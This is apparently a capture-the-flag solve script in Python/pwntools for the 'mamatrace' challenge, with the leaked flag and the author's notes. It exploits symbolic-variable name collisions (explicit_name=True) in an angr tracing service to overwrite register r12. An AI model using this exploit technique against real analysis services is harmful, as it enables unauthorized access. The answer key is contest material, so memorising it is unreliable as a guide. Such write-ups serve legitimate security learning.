#!/usr/bin/env python

import logging
from pwn import *

def connect():
    global p
    p = remote("mamatrace.quals2019.oooverflow.io", 5000)
    #p._logger.level = logging.DEBUG

def add_constrained(name, contents):
    p.sendlineafter("Choice: ", "2") # Constrained
    p.sendlineafter("name: ", name) # Name
    p.sendlineafter("(in hex): ", contents) # Contents

def add_unconstrained(name, num_bytes):
    p.sendlineafter("Choice: ", "1") # Unconstrained input
    p.sendlineafter("name: ", name) # Name
    p.sendlineafter("(in bytes): ", str(num_bytes)) # Bytes

def add_concrete(inp):
    p.sendlineafter("Choice: ", "3") # Concrete input
    p.sendlineafter(" (in hex): ", inp) # Concrete input

def symbolize_reg(reg):
    p.sendlineafter("Choice: ", "6") 
    p.sendlineafter("Register name? ", reg)

def concretize_reg(reg):
    p.sendlineafter("Choice: ", "5") 
    p.sendlineafter("Register name? ", reg)
    
def read_reg_val(reg):
    symbolize_reg(reg)
    p.sendlineafter("Choice: ", "7")
    p.recvuntil("CONSTRAINTS: [<Bool ")
    val = int(p.recvuntil(" ", drop=True), 16)
    return val

def print_constraints():
    p.sendlineafter("Choice: ", "7")
    print(p.recvuntil("Current binary"))

def make_all_regs_symbolic():
    
    for reg in ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'r12']: #, 'rsp', 'rbp']:
        symbolize_reg(reg)

def single_step_until_addr(addr, symbolize_everything=True):

    cur_addr = 0

    while cur_addr != addr:

        if symbolize_everything:
            make_all_regs_symbolic()

            # printf can't handle symbolic rdi
            if cur_addr == 0x1064e80:
                concretize_reg('rdi')

        p.sendlineafter("Choice: ", "1") 
        p.sendlineafter("steps: ", "1")
        p.recvuntil("SimState @ ")
        cur_addr = int(p.recvuntil(">",drop=True),16)

        print("Current Addr: " + hex(cur_addr))
        print_constraints()
        print(p.recvuntil("do?", p.sendlineafter("Choice: ", "3")))


connect()
p.sendlineafter("Choice: ", "2")
p.sendlineafter("Choice: ", "1") # Start trace

add_concrete('09')
add_constrained('r12_52_64', "60")

p.sendlineafter("Choice: ", "0") # Done

single_step_until_addr(0x40085e, symbolize_everything=False)
symbolize_reg('r12')
single_step_until_addr(0x400865, symbolize_everything=False)
concretize_reg('r12')

# Step 5000
p.interactive()

"""
STDOUT: b'Checking input...\nFlag byte 0: O\nFlag byte 1: O\nFlag byte 2: O\nFlag byte 3: {\nFlag byte 4: b\nFlag byte 5: r\nFlag byte 6: u\nFlag byte 7: m\nFlag byte 8: l\nFlag byte 9: e\nFlag byte 10: y\nFlag byte 11:  \nFlag byte 12: w\nFlag byte 13: a\nFlag byte 14: s\nFlag byte 15:  \nFlag byte 16: r\nFlag byte 17: i\nFlag byte 18: g\nFlag byte 19: h\nFlag byte 20: t\nFlag byte 21: ,\nFlag byte 22:  \nFlag byte 23: h\nFlag byte 24: a\nFlag byte 25: s\nFlag byte 26: h\nFlag byte 27:  \nFlag byte 28: c\nFlag byte 29: o\nFlag byte 30: n\nFlag byte 31: s\nFlag byte 32: i\nFlag byte 33: n\nFlag byte 34: g\nFlag byte 35:  \nFlag byte 36: i\nFlag byte 37: s\nFlag byte 38:  \nFlag byte 39: a\nFlag byte 40: w\nFlag byte 41: e\nFlag byte 42: s\nFlag byte 43: o\nFlag byte 44: m\nFlag byte 45: e\nFlag byte 46: !\nFlag byte 47: }\nFlag byte 48: \n\nFlag byte 49: \x00\nFlag byte 50: \x00\nFlag byte 51: \x00\nFlag byte 52: \x00\nFlag byte 53: \x00\nFlag byte 54: \x00\nFlag byte 55: \x00\nFlag byte 56: \x00\nFlag byte 57: \x00\nFlag byte 58: \x00\nFlag byte 59: \x00\nFlag byte 60: \x00\nFlag byte 61: \x00\nFlag byte 62: \x00\nFlag byte 63: \x00\nFlag byte 64: \x00\nFlag byte 65: \x00\nFlag byte 66: \x00\nFlag byte 67: \x00\nFlag byte 68: \x00\nFlag byte 69: \x00\nFlag byte 70: \x00\nFlag byte 71: \x00\nFlag byte 72: \x00\nFlag byte 73: \x00\nFlag byte 74: \x00\nFlag byte 75: \x00\nFlag byte 76: \x00\nFlag byte 77: \x00\nFlag byte 78: \x00\nFlag byte 79: \x00\nFlag byte 80: \x00\nFlag byte 81: \x00\nFlag byte 82: \x00\nFlag byte 83: \x00\nFlag byte 84: \x00\nFlag byte 85: \x00\nFlag byte 86: \x00\nFlag byte 87: \x00\nFlag byte 88: \x00\nFlag byte 89: \x00\nFlag byte 90: \x00\nFlag byte 91: \x00\nFlag byte 92: \x00\nFlag byte 93: \x00\nFlag byte 94: \x00\nFlag byte 95: \x00\n'


OOO{brumley was right, hash consing is awesome!}

"""


"""
Notes:
    Looks like it has to do with explicit_name=True. This allows us to conflict with other symbolic names...

After attempting to find a reg leak like before, i tried symbolizing every reg at every step (not helpful). Reading carefully through the pitas.py script, i discovered a strange argument explicit_name=True to the BVS. Having used Claripy a bunch, i realized this was not normal, and looking it up I can see why. It allows you to tell angr "this is exactly what my symbolic name should be". This can be bad if, for instance, you have multiple conflicting names. angr uses SSA, and thus this will break assumptions.

After flailing around on that and attempting to use it to overwrite the flags for the cmp jump (which i'm not sure even get used?), i tried using it to overwrite the r12 reg. Effectively, it ended up being:

   - Run program first, regularly, breaking at 85e to make r12 symbolic. Record what the name of the variable is.
   - Restart program, this time with a constrained variable with the same name as that r12 register.
   - Break again at 85e to make r12 symbolic. The constraint list now has duplicates. I discovered angr started state splitting after stepping a few, so i modified the next step.
   - Step to 88a and concretize r12. This ensures that we don't start state splitting.
   - Step to the end of the program and read flag from STDOUT
"""
